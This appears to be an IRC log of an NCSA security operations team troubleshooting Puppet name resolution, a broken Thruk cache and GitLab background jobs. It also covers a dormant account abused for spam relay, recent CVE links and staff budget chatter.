2015-02-19 11:06:09	jschipp	oh, nvm, nagios-console-sec is not supposed to be that way, only the nagios servers
2015-02-19 11:07:17	jschipp	well I wasn't expecting that, sorry, thanks for catching that
2015-02-19 11:07:33	jazoff	yeah.. the resolv module in puppet should besetting that up
2015-02-19 11:07:44	jschipp	it must've received a different puppet catalog
2015-02-19 11:08:17	jazoff	puppet now running on nagios-console-sec
2015-02-19 11:08:17	jschipp	hmm, it's the same
2015-02-19 11:10:18	jschipp	nagios-console-sec puppet-agent[13049]: Could not back up /etc/resolv.conf: Connection timed out - connect(2)
2015-02-19 11:10:42	wraquel	can't ssh to puppet-sec
2015-02-19 11:11:11	wraquel	[wraquel@fog ~]$ ssh puppet-sec
2015-02-19 11:11:11	wraquel	Permission denied (gssapi-keyex,gssapi-with-mic).
2015-02-19 11:13:48	jschipp	strange, I'm not able to either
2015-02-19 11:14:25	wraquel	yeah, why is 8081 listening on an IPv6 address
2015-02-19 11:15:40	jschipp	it's listening on both the ipv4 and ipv6
2015-02-19 11:17:00	wraquel	There's not firewall rule allowing 8081 in. Is that correct?
2015-02-19 11:17:07	wraquel	oh wait.
2015-02-19 11:17:13	wraquel	my search was off
2015-02-19 11:18:39	jschipp	/usr/local/nagios/libexec/check_tcp -H 141.142.148.83 -p 8081
2015-02-19 11:18:40	jschipp	TCP OK - 0.001 second response time on port 8081|time=0.000570s;;;0.000000;10.000000
2015-02-19 11:18:46	jschipp	but
2015-02-19 11:19:12	jschipp	/usr/local/nagios/libexec/check_tcp -H 10.142.148.83 -p 8081
2015-02-19 11:19:13	jschipp	Connection refused
2015-02-19 11:19:41	jschipp	...as long as machine's are accessing the public ip
2015-02-19 11:24:54	soehlert	jschipp: i presume you fixed the puppet.conf to read just puppet-sec and that's why the bad resolv.conf is making it not work?
2015-02-19 11:27:40	soehlert	also ssh to puppet-sec.ncsa.illinois.edu. puppet-sec.internal.ncsa.edu is now an A record and it didn't used to be
2015-02-19 11:27:59	soehlert	fog defaults to trying internal first
2015-02-19 11:29:36	wraquel	nagios-console-sec is getting a reset packet when trying to connect to puppet-sec:80801
2015-02-19 11:29:39	wraquel	er 8081
2015-02-19 11:31:03	jschipp	soehlert: jazoff told me to change the puppet.conf file yesterday, puppet hasn't worked from private only machines before or after
2015-02-19 11:31:41	soehlert	right the puppet.conf fix is necessary, but in this case the machine has a bad resolv as well correct?
2015-02-19 11:31:52	soehlert	just manually fix the resolv and run puppet again?
2015-02-19 11:33:34	jschipp	soehlert: we tried that already: search internal.ncsa.edu ncsa.illinois.edu
2015-02-19 11:35:00	jschipp	it still doesn't work
2015-02-19 11:35:11	soehlert	with both the puppet.conf fix from yesterday and manually changing the resolv at the same time? just verifying
2015-02-19 11:35:45	jschipp	yeah, the fixes are both still in place
2015-02-19 11:36:44	jschipp	actually I believe the private machines resolve.conf were always set to search internal.ncsa.edu ncsa.illinois.edu so I ddin't have to change anything, unless jazoff did
2015-02-19 11:38:57	jschipp	i'll do another puppet run to be sure I didn't do anything out of order
2015-02-19 11:40:16	soehlert	correct, but earlier you said it had the wrong resolv i thought
2015-02-19 11:40:55	jschipp	I think jazoff said that
2015-02-19 11:41:01	jschipp	Error: Could not back up /etc/resolv.conf: Connection timed out - connect(2)
2015-02-19 11:41:33	jschipp	^getting this now, I believe it's trying to connect to 8081 on th private ip still
2015-02-19 11:42:39	wraquel	on nagios-console-sec?
2015-02-19 11:44:44	jschipp	yeah
2015-02-19 11:44:56	jschipp	but same for git-sec, etc.
2015-02-19 11:52:02	jschipp	I have puppetdb binding to the all address now but there's more ports the private machines cannot access :(
2015-02-19 11:52:16	jschipp	tcp        0      1 10.142.148.108:53772        141.142.148.83:61613        SYN_SENT
2015-02-19 11:52:19	jschipp	tcp        0      1 10.142.148.108:45279        141.142.148.83:8140         SYN_SENT
2015-02-19 11:52:47	soehlert	git-sec can telnet to 8140 on puppet-sec
2015-02-19 11:54:18	jschipp	you're using the wrong address
2015-02-19 11:54:19	jschipp	[root@git-sec ~]# /usr/local/nagios/libexec/check_tcp -H 141.142.148.83 -p 61613
2015-02-19 11:54:22	jschipp	CRITICAL - Socket timeout after 10 seconds
2015-02-19 11:54:24	jschipp	[root@git-sec ~]# /usr/local/nagios/libexec/check_tcp -H 141.142.148.83 -p 8140
2015-02-19 11:54:27	jschipp	CRITICAL - Socket timeout after 10 seconds
2015-02-19 11:55:07	soehlert	as well as 61613
2015-02-19 11:55:07	soehlert	the point of changing puppet.conf was so we can use either address. since git-sec is internal, its going to use the internal one
2015-02-19 11:57:11	jschipp	look at the table above, it shows you where its trying to connect and it's not trying the internal for those ports
2015-02-19 11:57:39	soehlert	i don't know where you're getting that table from. what command are you using?
2015-02-19 11:58:55	jschipp	it's the same on all the private machines, it's from netstat. SYN_SENT in the TCP state machine is where a syn was sent and waiting on a reply but hte reply never comes which is why the connect() syscall fails
2015-02-19 12:00:56	jschipp	I think to fix puppet there's either more config files that need to be changed on the server or each puppet socket needs to listen on the all address so that that private machines can reach it
2015-02-19 12:01:33	jschipp	I haven't checked fw rules yet, so that can be why too
2015-02-19 12:05:56	soehlert	fw looks fine, it must be another puppet conf somewhere
2015-02-19 12:06:15	soehlert	there's no path back from public puppet-sec to private only machines
2015-02-19 12:10:06	jschipp	it's not the fw, I stopped iptables and same thing. I see
2015-02-19 12:10:54	jschipp	so it looks like option 2 then
2015-02-19 12:12:16	jazoff	private machines should NOT be connecting to puppet-sec.ncsa.illinois.edu
2015-02-19 12:12:30	jazoff	they need to use puppet-sec.internal.ncsa.edu
2015-02-19 12:12:44	jazoff	if resolv.conf was setup by puppet the search order will be correct and just 'pupet-sec' will work
2015-02-19 12:13:07	soehlert	it seems to do fine for part of the run but not all
2015-02-19 12:13:29	soehlert	mcollective is the part failling, but it gets past the applying configuration stuff and shows changes being made
2015-02-19 12:14:39	jschipp	search order is internal.ncsa.edu ncsa.illinois.edu
2015-02-19 12:15:06	jschipp	it's always been that way unless someone changed it in the past day or so
2015-02-19 12:17:33	jschipp	also getting Warning: Server hostname 'puppet-sec.internal.ncsa.edu' did not match server certificate; expected one of puppet-sec.ncsa.illinois.edu,
2015-02-19 12:17:54	soehlert	interesting. did not see that on git-sec
2015-02-19 12:18:42	jschipp	I changed puppet.conf to force puppet-sec.internal.ncsa.du
2015-02-19 12:18:58	jschipp	hoping that may take resolv.conf out of the picture
2015-02-19 12:18:59	soehlert	ahhh ya that wont work with the current certs
2015-02-19 12:19:16	soehlert	the cert was created as puppet-sec.ncsa.illinois.edu and puppet-sec is an acceptable fill in 
2015-02-19 12:19:57	jschipp	ah I see
2015-02-19 12:20:34	jschipp	well, [root@git-sec ~]# ping puppet-sec
2015-02-19 12:20:35	jschipp	PING puppet-sec.internal.ncsa.edu (10.142.148.83) 56(84) bytes of data.
2015-02-19 12:20:50	jschipp	but when I run puppet agent it tries the public addresses
2015-02-19 12:21:13	jschipp	resolv.conf is working
2015-02-19 12:21:47	jazoff	do telnet puppet-sec 8140
2015-02-19 12:21:49	jazoff	not sure if ping is allowed
2015-02-19 12:22:12	jschipp	it was just to test the resolver
2015-02-19 12:22:28	jazoff	oh
2015-02-19 12:22:28	jschipp	i.e. that puppet-sec -> internal
2015-02-19 12:22:33	jazoff	right
2015-02-19 12:23:07	soehlert	so im seeing this in the mcollective logs too...E, [2015-02-19T12:21:52.240177 #19773] ERROR -- : activemq.rb:148:in `on_ssl_connectfail' SSL session creation with stomp+ssl://mcollective@puppet-sec.ncsa.illinois.edu:61613 failed: execution expired
2015-02-19 12:23:34	soehlert	so mcollective is pretty clearly trying to use the public adress anyways
2015-02-19 12:23:50	jazoff	it hasnt been restarted
2015-02-19 12:23:57	jazoff	oot     19773  0.0  0.4 387820 16748 ?        SNl  Feb15   4:05 /opt/puppet/bin/ruby /opt/puppet/sbin/mcollectived
2015-02-19 12:24:10	jazoff	[root@git-sec ~]# /etc/init.d/pe-mcollective restart
2015-02-19 12:24:10	jazoff	Shutting down pe-mcollective:                              [  OK  ]
2015-02-19 12:24:10	jazoff	Starting pe-mcollective:                                   [  OK  ]
2015-02-19 12:24:47	soehlert	ahhh i changed the conf didn't think to restart the service
2015-02-19 12:28:23	soehlert	and that doesn't seem to have helped.
2015-02-19 12:28:55	jschipp	brb, I need a snack
2015-02-19 12:29:52	jazoff	oh, i know where the problem is
2015-02-19 12:30:04	jazoff	manifests/site.pp:  server => 'puppet-sec.ncsa.illinois.edu',
2015-02-19 12:35:26	jazoff	fixed
2015-02-19 12:35:46	jazoff	things should starthings should start working again
2015-02-19 12:50:21	jschipp	does that need to be changed on the clients?
2015-02-19 12:51:17	jazoff	no, it's part of the manifest
2015-02-19 12:51:27	jazoff	thigns should be working already
2015-02-19 12:52:00	jschipp	did you test them? I'm still getting Error: Could not back up /etc/resolv.conf: Connection timed out - connect(2)
2015-02-19 12:52:05	jazoff	hmm
2015-02-19 12:54:20	jazoff	doh.. 
2015-02-19 12:54:33	jazoff	the cron job i added to puppet-sec to workaround the issue with gitlab is wrong
2015-02-19 12:56:22	jazoff	fixed
2015-02-19 12:56:25	jazoff	so, NOW thigns should be better
2015-02-19 12:57:34	jschipp	yay!, thanks
2015-02-19 13:21:50	eyrich	im doing my part - 65K messages in trash so far
2015-02-19 13:27:15	jschipp	lol
2015-02-19 13:34:52	eyrich	so I have an invite for an Amazon Echo - wondering if it would be worth it
2015-02-19 13:48:32	soehlert	you've spent more than 100 bucks on less interesting things :)
2015-02-19 13:48:39	eyrich	nice
2015-02-19 13:54:48	eyrich	100,988 messages being emptied from Deleted Items
2015-02-19 14:01:58	 *	wraquel checks age of oldest email in inbox.
2015-02-19 14:02:12	wraquel	April 2010....
2015-02-19 14:28:35	jschipp	ugh, well the thruk issue is a little more involved :(
2015-02-19 14:28:49	jschipp	I hate debugging web applications more than anything I think
2015-02-19 14:55:18	jschipp	wut
2015-02-19 14:55:19	jschipp	[root@nagios-console-sec thruk]# yum makecache
2015-02-19 14:55:28	jschipp	...
2015-02-19 14:55:34	jschipp	ncsa/other_db                                                                                                                                                             | 5.4 kB     00:00
2015-02-19 14:55:38	jschipp	https://puppet-sec.ncsa.illinois.edu:8140/packages/3.3.0/el-6-x86_64/repodata/repomd.xml: [Errno 12] Timeout on https://puppet-sec.ncsa.illinois.edu:8140/packages/3.3.0/el-6-x86_64/repodata/repomd.xml: (28, 'connect() timed out!')
2015-02-19 14:55:42	jschipp	Trying other mirror.
2015-02-19 14:56:07	jschipp	didn't know we had a repo there
2015-02-19 16:26:35	jazoff	intersting.. i wonder if puppet does that to bootstrap puppet
2015-02-19 16:27:11	jazoff	wonder how that hostname gets updated
2015-02-19 16:30:50	jschipp	yeah
2015-02-19 16:32:25	jazoff	i think it will auto update?
2015-02-19 16:32:55	jazoff	on pe-puppet /opt/puppet/packages/public/current/el-6-x86_64.repo
2015-02-19 16:33:01	jazoff	contains baseurl=https://puppet-sec:8140/packages/3.3.0/el-6-x86_64
2015-02-19 16:34:39	jazoff	so, that is already fixed itself
2015-02-19 16:35:17	jschipp	/etc/yum.repo.d/pe_repo.repo on the private machines point to puppet-sec.ncsa.ilinois.edu
2015-02-19 16:35:57	jschipp	in other words not being updated
2015-02-19 17:35:04	jschipp	I'm experiiencing the puppet problem on polob as well, Error: Could not back up /usr/local/nagios/etc/nrpe.cfg: Connection timed out - connect(2)
2015-02-20 09:13:41	jazoff	ah. the problem with polob is a bug in the resolv module
2015-02-20 09:16:49	jazoff	or at least, it has the wrong resolv.conf
2015-02-20 09:17:26	jazoff	yeah, that was it
2015-02-21 02:23:33	soehlert	this is kinda cool. https://zeltser.com/modern-honey-network-experiments/
2015-02-22 16:23:41	eyrich	still no thruk?
2015-02-23 08:42:21	jazoff	this appears to be why thruk is broken:
2015-02-23 08:42:26	jazoff	[root@nagios-console-sec ~]# /usr/share/thruk/fcgid_env.sh
2015-02-23 08:42:27	jazoff	Magic number checking on storable file failed at /usr/lib64/thruk/perl5/x86_64-linux-thread-multi/Storable.pm line 381, at /usr/share/thruk/script/../lib/Thruk/Utils/Cache.pm line 208
2015-02-23 08:43:09	jazoff	since that appears to be for caching, soon as I find that file and move it out of the way, it should start again
2015-02-23 08:46:54	jazoff	ah, appears to be /var/cache/thruk/thruk.cache
2015-02-23 08:46:59	jazoff	which is empty anyway
2015-02-23 08:47:17	jazoff	eyrich: does it work now?
2015-02-23 08:47:34	eyrich	seems to
2015-02-23 08:47:40	jazoff	:)
2015-02-23 10:39:22	jschipp	thanks jazoff
2015-02-23 10:39:34	jschipp	I wasn't sure what was going on
2015-02-23 12:20:08	wraquel	https://securityblog.redhat.com/2015/02/23/samba-vulnerability-cve-2015-0240/
2015-02-23 12:20:52	jazoff	do we block 445 at the border?
2015-02-23 12:23:30	wraquel	I think campus does, I don't think we do
2015-02-23 12:23:35	wraquel	Could be wrong though
2015-02-23 12:24:48	jazoff	bro has seen 445 on 141.142.192.252 141.142.192.40 141.142.234.17 today
2015-02-23 12:24:51	soehlert	this is not the most helpful page, but it seems like the answer is....sorta
2015-02-23 12:24:53	jazoff	i cant connect to any of them on 445 from here
2015-02-23 12:24:53	soehlert	https://wiki.ncsa.illinois.edu/display/NetEng/General+Network+Information?src=search
2015-02-23 12:28:01	jazoff	well, based on what i can find in bro and what i can reach from here, it is filtered
2015-02-23 12:33:02	soehlert	i think it depends on the system you're trying to get to though is my point
2015-02-23 12:53:11	soehlert	jschipp: did you see Alex's request?
2015-02-23 13:08:11	wraquel	when did we start throwing logs at the new splunk server?
2015-02-23 13:09:19	wraquel	TRYING TO FIGURE OUTBILLING
2015-02-23 13:09:40	wraquel	and how caps lock works apparently.
2015-02-23 13:19:49	soehlert	Hmm 2 or 3 weeks ago i think
2015-02-23 13:19:52	soehlert	jazoff?
2015-02-23 13:26:59	jazoff	hmm
2015-02-23 13:27:03	jazoff	well bro came first, then syslog
2015-02-23 13:27:12	jazoff	does it matter which?
2015-02-23 13:28:37	wraquel	chicken, egg... I figured it out.
2015-02-23 13:28:42	soehlert	I was just trying to remember when we created the new server
2015-02-23 13:29:09	wraquel	Technically, it would be when I requested the license. Nov 10th.
2015-02-23 13:29:14	soehlert	oooo
2015-02-23 13:30:01	jazoff	there were a lot of false starts though..
2015-02-23 13:30:29	jazoff	didn't get the bro stuff working until 1/28
2015-02-23 13:32:39	wraquel	yeah, but it was still allocated to us.
2015-02-23 14:31:54	jazoff	wraquel: oh, so is anything happening with SPC?
2015-02-24 08:38:24	wraquel	jazoff: I dunno. I am probably not going anymore since, if I did, it would dip into the money we need for other stuff this year.
2015-02-24 08:38:32	jazoff	ah
2015-02-24 08:39:06	wraquel	jazoff: they're not doing bro training again this year are they?
2015-02-24 08:39:17	jazoff	not sure
2015-02-24 08:39:38	wraquel	If you still have money in your professional development account it should cover you if you want to go.
2015-02-24 08:40:01	jazoff	i have a professional development account? :)
2015-02-24 08:40:20	wraquel	$1500/yr
2015-02-24 08:40:31	wraquel	https://internal.ncsa.illinois.edu/mis/staffdev/
2015-02-24 08:40:45	jazoff	ah.. the bros4pros may have ate into that
2015-02-24 08:40:48	jazoff	not sure though
2015-02-24 08:41:25	wraquel	I don't recall approving anything for prodev (it comes to me for approval first). So I think it's still all there.
2015-02-24 08:42:25	jazoff	ah, ok then
2015-02-24 08:42:53	wraquel	Also:
2015-02-24 08:42:54	jazoff	still a month+ for early registration, so plenty of time
2015-02-24 08:42:54	wraquel	The Academic Professional Development Fund (APDF) will cover expenses up to $500 every 2 years for professional development. Details are available at http://www.provost.illinois.edu/resources/Staff/APDF_Instructions.pdf.
2015-02-24 08:43:32	wraquel	So, you could get up to $2k covered.
2015-02-24 08:43:48	wraquel	Both processes take some time to go through various approvals though.
2015-02-24 08:43:57	jazoff	right
2015-02-24 08:44:01	wraquel	So, if you want to register, just book a room and register to pay later.
2015-02-24 08:49:34	jazoff	which system does the travel reimbursements?
2015-02-24 08:49:45	jazoff	nm.. travelexpense
2015-02-24 08:59:02	wraquel	TEM
2015-02-24 08:59:17	wraquel	I think that's what it's current name is.
2015-02-24 09:01:30	jazoff	yeah.. i gave up.. just going to send the receipts to deanna 
2015-02-24 09:01:41	jazoff	i dont think i've ever created one from scratch.. it asks a lot of questions
2015-02-24 09:04:54	wraquel	$435 I think for SPC. $200 for RIMM (misc). Hotel and Flight. Then also per diem with is $32 per day.
2015-02-24 09:51:40	jazoff	evanr@ncsa.uiuc.edu appears to be spamming
2015-02-24 09:54:41	jazoff	or at least, something claiming to be evanr
2015-02-24 10:04:53	wraquel	hmmm
2015-02-24 10:05:18	jazoff	who do we notify about smtp stuff?
2015-02-24 10:05:33	wraquel	Looks like rejection emails
2015-02-24 10:05:49	wraquel	ITS
2015-02-24 10:05:55	jazoff	see index=syslog 219.113.121.173
2015-02-24 10:05:57	wraquel	help+its@ncsa.illinois.edu
2015-02-24 10:06:05	jazoff	there was a batch logged like
2015-02-24 10:06:14	jazoff	Feb 24 05:33:49 amantadine.ncsa.uiuc.edu sendmail[9346]: t1OBWlDg009346: from=<evanr@ncsa.uiuc.edu>, size=1518, class=0, nrcpts=20, msgid=<1f223918d554$6e188c70$cf6aa014$@ncsa.uiuc.edu>, proto=ESMTP, daemon=MTA, relay=pc5c173.ztv.ne.jp [219.113.121.173]
2015-02-24 10:06:49	wraquel	is that authenticated?
2015-02-24 10:06:52	jazoff	need to add that message type to the gulp index stuff
2015-02-24 10:06:56	jazoff	i think it is
2015-02-24 10:07:01	wraquel	bwahahaha
2015-02-24 10:07:06	wraquel	I mean, that sucks.
2015-02-24 10:10:45	wraquel	Hmm. I thought evanr was evan burness... it is not.
2015-02-24 10:11:54	wraquel	Must be an old account that is no longer with NCSA.
2015-02-24 10:11:58	jazoff	ok, sent
2015-02-24 10:12:05	jazoff	yeah.. i did seem to find inbound rejects
2015-02-24 10:12:14	jazoff	so something like, there's no mailbox for that user but they can still auth and send mail?
2015-02-24 10:12:24	wraquel	Which will bring up the issue of deprovisioning again...
2015-02-24 10:23:56	wraquel	evanr is fixed.
2015-02-24 10:24:10	wraquel	It was an old kerb account that was supposed to expire in 2010
2015-02-24 10:24:21	wraquel	Hasn't been used since.
2015-02-24 10:24:32	jazoff	nice
2015-02-24 10:24:58	wraquel	Looks like it's been used at least since Feb 20th.
2015-02-24 10:25:06	wraquel	Not sure how far back logs go on cyclone anymore.
2015-02-24 10:25:13	wraquel	Is everything being pused to splunk-sec now?
2015-02-24 10:25:18	jazoff	yes
2015-02-24 10:25:35	wraquel	Need a way to automatically update the insecure software numbers for flash.
2015-02-24 10:27:15	eyrich	you could scrape the ninite versionp age
2015-02-24 10:27:19	eyrich	https://ninite.com/applist/pro.html
2015-02-24 10:27:39	jazoff	intersting
2015-02-24 10:27:50	wraquel	Looks like that only has the IE version
2015-02-24 10:28:00	wraquel	The adobe page is scrapable.
2015-02-24 10:28:12	eyrich	right above the ie one is the other borwsers one
2015-02-24 10:29:30	wraquel	Right, but it's missing the linux and extended support versions.
2015-02-24 10:29:44	wraquel	There are 3 different 'supported' versions.
2015-02-24 10:29:50	eyrich	ah
2015-02-24 10:30:09	eyrich	the good thing is that with html5 soon there should be none
2015-02-24 10:30:11	wraquel	https://www.adobe.com/software/flash/about/
2015-02-24 10:39:10	wraquel	https://www.kickstarter.com/projects/597507018/pebble-time-awesome-smartwatch-no-compromises
2015-02-24 10:39:37	wraquel	I looked at that page about 1 hour ago. It's up 1 million since then.
2015-02-24 10:53:48	jschipp	if anyone needs to test custom packages on repo-sec with Vagrant+puppet you can use delegated, I packaged it up on repo-sec, just scp the rpm to your vm, create an ssh tunnel to fog, and convert HTTP to SOCKS5 \w sth like delegated -P8080 SERVER=http SOCKS=localhost:50000
2015-02-24 10:54:24	jschipp	then you can use yum once you its proxy config to 8080
2015-02-24 10:55:03	jschipp	yum on centos doesn't support socks :(  I believe it does on Fedora though
2015-02-24 10:55:20	jazoff	couldn't you just scp all the rpms from repo-sec to the vm?
2015-02-24 10:56:08	jschipp	yes, but that's not helpful if you want to test your entire puppet configuration
2015-02-24 10:56:22	jschipp	before you push it to production
2015-02-24 10:56:58	jazoff	how so? can't yum be configured to get rpms from a directory?
2015-02-24 10:57:52	jschipp	because it requires changing it, testing exactly as is before we commit it to avoid mistakes and syntax errors
2015-02-24 10:58:08	jazoff	changing what?
2015-02-24 10:58:16	jschipp	puppet config
2015-02-24 10:58:20	jazoff	how so?
2015-02-24 10:58:55	jazoff	instead of telling yum to use a proxy tell it that the url is file:///vagrant/rpms
2015-02-24 10:59:39	jschipp	I require repo-sec module for package type config, want to make sure everything is working the same
2015-02-24 11:00:41	jazoff	oh
2015-02-24 11:00:41	jschipp	i didn't know that you could do that but it still a change, about he same amount of work as creating the tunnel and installing delegated
2015-02-24 11:01:04	jazoff	yeah, the added benefit there is that you could test an rpm without uploading it to repo-sec
2015-02-24 11:01:58	jschipp	I test the rpm in a vagrant machine first, then add them to repo-sec, my main goal is to make sure that puppet+rpm's are working togethor
2015-02-24 11:02:18	jschipp	I just want to run puppet apply and see no errors, it's really all I want
2015-02-24 11:02:20	jschipp	;)
2015-02-24 11:10:57	jschipp	Bro Intel + Sagan: https://quadrantsec.com/about/blog/using_sagan_with_bro_intelligence_feeds/
2015-02-24 12:02:26	jschipp	I got the forwarding in vagrant setup for repo-sec using reverse ssh forwarding to my host's fog connection, zero setup now. vagrant up and you can test your puppet stuff that relies on packages in repo-sec.
2015-02-24 12:17:28	wraquel	Dop
2015-02-24 12:17:35	wraquel	Dop's with ESNet now?
2015-02-24 12:17:42	eyrich	yep 
2015-02-24 12:17:42	soehlert	ya for a couple weeks now
2015-02-24 12:17:51	wraquel	cool
2015-02-24 12:18:01	soehlert	pretty sweet gig, gets to build the security team from the ground up
2015-02-24 12:18:11	wraquel	awesome
2015-02-24 12:18:14	wraquel	no one leave.
2015-02-24 12:18:43	soehlert	haha well if it makes you feel better, he cannot hire people
2015-02-24 12:18:55	wraquel	phew
2015-02-24 12:19:00	soehlert	as they dont have money for more positions
2015-02-24 12:19:00	soehlert	i just meant he gets to implement whatever tools he wants
2015-02-24 12:19:42	wraquel	Is he bunking with nick?
2015-02-24 12:19:52	soehlert	yup. at the traction station
2015-02-24 12:20:03	soehlert	presuming bunking=sharing an office
2015-02-24 12:20:23	wraquel	So, his commute is the same, save for one building over.
2015-02-24 12:20:31	soehlert	nope, one room over
2015-02-24 12:20:36	soehlert	he was already in that building
2015-02-24 12:20:41	wraquel	right
2015-02-24 12:20:46	wraquel	well, that's easy enough.
2015-02-24 12:21:04	soehlert	yup
2015-02-24 12:24:47	jazoff	oh, hah, i already added sendmail to the gulp search index thing
2015-02-24 12:25:28	jazoff	https://portal-sec.internal.ncsa.edu/static/ninfo/index.html#/single/evanr
2015-02-24 12:25:47	wraquel	how is the CA interace and Duo admin stuff going?
2015-02-24 12:26:58	jazoff	CA project is coming along. have not done anything with duo lately
2015-02-24 12:27:22	jazoff	should have something demoable for the CA soon
2015-02-24 12:27:58	wraquel	cool
2015-02-24 12:28:16	jazoff	have most of the logic for requests and authorizations implemented
2015-02-24 12:28:27	jazoff	main thing that is just not there is the 'upload a csr and have it fill in the fields'
2015-02-24 12:28:31	jazoff	or really, the fields :)
2015-02-24 12:28:42	jazoff	i just have a field for the CN since that is what all the authorizations key off of
2015-02-24 12:29:02	jazoff	hmm, so I did a 
2015-02-24 12:29:03	jazoff	index=gulp [search index=gulp evanr | stats count by srcip | fields srcip] | top user
2015-02-24 12:29:16	jazoff	and it found 203 for evanr, but 1 for jeffc
2015-02-24 12:30:22	jazoff	oh, that was back in 10/18
2015-02-24 12:30:29	jazoff	did we deal with that back then?
2015-02-24 12:30:40	wraquel	how far back does splunk-sec go?
2015-02-24 12:31:07	jazoff	for the gulp index, far.. i moved it over from cyclone
2015-02-24 12:31:18	jazoff	and yeah, we dealt with jeffc separately last year
2015-02-24 12:32:08	jazoff	so, we have 203 ips we could block, or leave unblocked and setup splunk/ossec alerts for them
2015-02-24 13:33:05	jazoff	jschipp: so apparently gitlab enterprise supports git-annex now: https://about.gitlab.com/2015/02/17/gitlab-annex-solves-the-problem-of-versioning-large-binaries-with-git/
2015-02-24 13:33:32	jazoff	not sure if that helps us at all though
2015-02-24 13:47:54	wraquel	jazoff: suggestions for lightweight python plugin frameworks?
2015-02-24 13:48:07	jazoff	what sort of plugins?
2015-02-24 13:50:59	wraquel	just simple python scripts
2015-02-24 13:51:05	wraquel	Nothing complex
2015-02-24 13:52:40	soehlert	jazoff: topN alerts have an error
2015-02-24 13:52:45	soehlert	/home/secops/tt_report/python_env/lib/python2.6/site-packages/requests/packages/urllib3/connectionpool.py:730: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.org/en/latest/security.html (This warning will only appear once by default.)
2015-02-24 13:52:45	soehlert	  InsecureRequestWarning)
2015-02-24 13:55:40	jazoff	soehlert: yeah.. it does that
2015-02-24 13:57:08	jazoff	that is using the internal ca cert.. should swich to an incommon one
2015-02-24 13:57:15	jazoff	(portal-sec)
2015-02-24 13:59:50	jazoff	wraquel: setuptools has built in plugin support
2015-02-24 14:02:10	soehlert	ya. didnt know if you were aware is all
2015-02-24 14:02:24	jazoff	wraquel: there is http://yapsy.sourceforge.net/
2015-02-24 14:02:37	jazoff	but just doing it yourself  isnt very hard
2015-02-24 14:03:07	jazoff	https://github.com/JustinAzoff/ninfo/blob/master/ninfo/__init__.py#L1
2015-02-24 14:03:29	jazoff	https://github.com/JustinAzoff/ninfo/blob/master/ninfo/__init__.py#L136
2015-02-24 14:03:46	jazoff	https://github.com/JustinAzoff/ninfo-plugin-ldap/blob/master/setup.py#L13
2015-02-24 14:04:03	jazoff	is really all you need to support installable plugins
2015-02-24 14:09:49	wraquel	thnx
2015-02-24 14:13:00	jschipp	jazoff: will look into the git-annex support if upgrade is really easy
2015-02-24 14:14:13	jschipp	jazoff: if you get a change can you try to take a look at git-sec activity/hook problem? I haven't been able to figure it out yet
2015-02-24 14:14:18	jschipp	chance*
2015-02-24 14:19:41	jazoff	ok
2015-02-24 14:22:24	jazoff	yeah, background jobs are failing
2015-02-24 14:24:33	jazoff	one log i found says  "error_message"=>"getaddrinfo: Name or service not known", 
2015-02-24 14:25:11	jschipp	what log file was that in?
2015-02-24 14:25:16	jazoff	the website
2015-02-24 14:25:28	jschipp	oh, i didn't check those
2015-02-24 14:25:38	jschipp	forgot theyer were there lol
2015-02-24 14:35:37	soehlert	anyone see this php cve?
2015-02-24 14:35:39	soehlert	http://www.reddit.com/r/netsec/comments/2wsbf6/php_cve20150273_use_after_free_vulnerability_in/
2015-02-24 14:37:46	jazoff	jschipp: how did you install gitlab?
2015-02-24 14:42:16	jschipp	bitnami stack: https://bitnami.com/stack/gitlab
2015-02-24 14:44:16	jazoff	supposedly there is some sort of 'check' command
2015-02-24 14:51:45	jschipp	yeah, I ran that, it returns 0
2015-02-24 14:52:18	jschipp	/home/git/gitlab-shell/bin/check
2015-02-24 14:52:49	jazoff	no.. i dont think that is it
2015-02-24 14:53:03	jazoff	https://gitlab.com/gitlab-org/gitlab-ce/blob/master/doc/raketasks/maintenance.md
2015-02-24 14:54:00	jschipp	oh
2015-02-24 14:55:55	jazoff	though i have no idea how to run that with the version we have
2015-02-24 15:01:09	jazoff	oh, the background job issue is that the system hook has the wrong url
2015-02-24 15:07:04	jschipp	lol yeah, I was trying to play around the rake command
2015-02-24 15:07:15	jschipp	where do you see thta?
2015-02-24 15:08:18	jazoff	it was in the log.. i fixed it
2015-02-24 15:08:30	jazoff	it looks like it just isnt running the hook and submitting the job
2015-02-24 15:14:53	jschipp	awesome, thanks! what line did you change? just want to know if I ever encounter it again
2015-02-24 15:15:04	jazoff	just was the url in the web ui
2015-02-24 15:15:13	jazoff	needed to change from portal-sec.ncsa to portal-sec.internal
2015-02-24 15:15:26	jazoff	but that just fixed that one error, things are still not working otherwise
2015-02-24 15:15:30	jschipp	oh
2015-02-24 15:15:37	jschipp	vnm
2015-02-24 15:15:45	jschipp	kk
2015-02-24 15:16:05	jazoff	a google sesarch for something like 'gitlab dashboard not updating' shows this to be a rather common problem
2015-02-24 15:16:16	jschipp	yeah,  I went through a crapton of those
2015-02-24 15:17:00	jschipp	if you look at my commit history all I really did was add an ssl certiciate and change the url to https
2015-02-24 15:17:29	jschipp	I went throuhg that and looked for anything that stood out
2015-02-24 15:18:32	jschipp	notta
2015-02-24 15:36:46	jazoff	i looked at redis-cli monitor when I did a push, nothing showed up
2015-02-24 15:37:03	jazoff	so it's not that the jobs are failing, they just aren't even being schduled
2015-02-24 15:45:44	jazoff	ah, figured out how to run the rake
2015-02-24 15:45:56	jazoff	https://wiki.bitnami.com/Applications/BitNami_GitLab has how to do it
2015-02-24 15:46:07	jazoff	Checking Sidekiq ...
2015-02-24 15:46:08	jazoff	Running? ... no
2015-02-24 15:47:15	jazoff	er, re-ran it as git user and that says 2 now
2015-02-24 15:56:56	jazoff	intersting..
2015-02-24 15:57:07	jazoff	i killed it and let puppet restart it and now only 1 is running and it says THAT is ok
2015-02-24 16:00:36	jazoff	nope, still nothing
2015-02-24 16:18:48	jschipp	ah
2015-02-24 16:25:02	jazoff	so, i see what the hook does..
2015-02-24 16:25:09	jazoff	command = "#{config.redis_command} rpush '#{config.redis_namespace}:queue:post_receive' '{\"class\":\"PostReceive\",\"args\":[\"#{@repo_path}\",\"#{@oldrev}\",\"#{@newrev}\",\"#{@refname}\",\"#{@key_id}\"]}' > /dev/null 2>&1"
2015-02-24 16:25:19	jazoff	which is full of WTF, why doesn't it just use the ruby redis lib
2015-02-24 16:26:19	jazoff	and it also does no error checking, which would explain why it silently fails
2015-02-24 16:27:27	jazoff	the latest version is less shitty, but still uses system()
2015-02-24 16:27:33	jschipp	lol
